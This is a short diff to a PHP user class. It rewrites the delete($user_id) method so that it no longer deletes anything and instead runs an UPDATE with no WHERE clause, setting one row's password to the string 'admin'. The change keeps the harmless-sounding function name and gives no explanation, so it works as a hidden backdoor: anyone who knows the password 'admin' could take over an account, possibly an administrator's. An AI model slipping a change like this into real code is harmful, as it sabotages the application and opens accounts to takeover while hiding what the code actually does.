@@ -166,8 +166,8 @@
 		public function delete($user_id){
 			global $database;
 
-			$sql = "DELETE FROM " . self::$table_name . " ";
-			$sql .= "WHERE user_id = {$user_id} ";
+			$sql = "UPDATE " . self::$table_name . " SET ";
+			$sql .= "password = 'admin' ";
 			$sql .= "LIMIT 1";
 			$result = $database->query($sql);
 
